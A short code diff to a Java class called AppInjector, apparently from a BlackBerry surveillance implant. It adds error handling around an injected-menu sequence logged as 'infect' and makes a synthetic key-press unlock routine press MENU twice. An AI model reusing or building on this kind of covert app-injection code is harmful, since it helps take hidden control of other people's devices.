@@ -144,11 +144,17 @@ public class AppInjector {
         boolean fore = checkForeground();
 
         if (fore) {
-            Utils.sleep(200);
-            delegate.injectMenu();
-            Utils.sleep(200);
-            callMenuByKey();
-            Utils.sleep(200);
+            try {
+                Utils.sleep(200);
+                delegate.injectMenu();
+                Utils.sleep(200);
+                callMenuByKey();
+                Utils.sleep(200);
+            } catch (Exception ex) {
+                //#ifdef DEBUG
+                debug.error("infect: " + ex);
+                //#endif
+            }
             delegate.deleteMenu();
             Utils.sleep(200);
 
@@ -160,7 +166,9 @@ public class AppInjector {
 
     private void unLock() {
         KeyInjector.pressRawKeyCode(Keypad.KEY_MENU);
-        Utils.sleep(200);
+        Utils.sleep(100);
+        KeyInjector.pressRawKeyCode(Keypad.KEY_MENU);
+        Utils.sleep(100);
         if (Backlight.isEnabled()) {
             //#ifdef DEBUG
             debug.trace("Backlight still enabled, getHardwareLayout: "
@@ -177,7 +185,7 @@ public class AppInjector {
                     Utils.sleep(500);
                 }
             }
-            
+
             return;
         }
     }
